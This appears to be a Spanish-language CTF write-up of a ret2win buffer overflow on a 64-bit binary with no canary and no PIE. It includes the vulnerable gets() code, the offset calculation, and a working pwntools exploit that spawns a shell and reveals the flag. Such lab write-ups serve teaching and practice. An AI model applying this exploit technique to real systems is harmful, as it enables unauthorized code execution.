# Buffer overflow básico (ret2win)

**Reto:** `pwn/warmup` — 150 pts
**Dificultad:** alta

## El binario

Un ELF de 64 bits sin PIE y sin canario. Existe una función `win()` que nunca se
llama en el flujo normal:

```c
void win() {
    system("/bin/sh");
}

void vuln() {
    char buf[64];
    gets(buf);          // desbordamiento clásico
}
```

Comprobamos las protecciones:

```
$ checksec --file=./warmup
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
PIE:      No PIE
```

## Cálculo del offset

Generamos un patrón cíclico para localizar el punto exacto donde se sobrescribe
la dirección de retorno:

```python
from pwn import *

payload = cyclic(200)
# ...tras el crash, en gdb:
#   rsp apunta a 0x6161616e6161616d
offset = cyclic_find(0x6161616e6161616d)  # -> 72
```

Confirmamos: 64 bytes del buffer + 8 del `saved rbp` = **72** antes de `rip`.

## Exploit

Sobrescribimos la dirección de retorno con la de `win()`:

```python
from pwn import *

elf = context.binary = ELF('./warmup')
p = process('./warmup')

payload = flat({
    72: elf.symbols['win']
})

p.sendline(payload)
p.interactive()
```

## Resultado

```
[+] Starting local process './warmup'
[*] Switching to interactive mode
$ cat flag.txt
CTF{r3t2w1n_n0_c4n4ry_n0_pr0bl3m}
```

## Notas

- Si hubiera *stack alignment* que rompa `system()`, se antepone un gadget `ret`
  para alinear a 16 bytes antes de saltar a `win()`.
- Con PIE activado habría que filtrar una dirección primero para calcular la base.
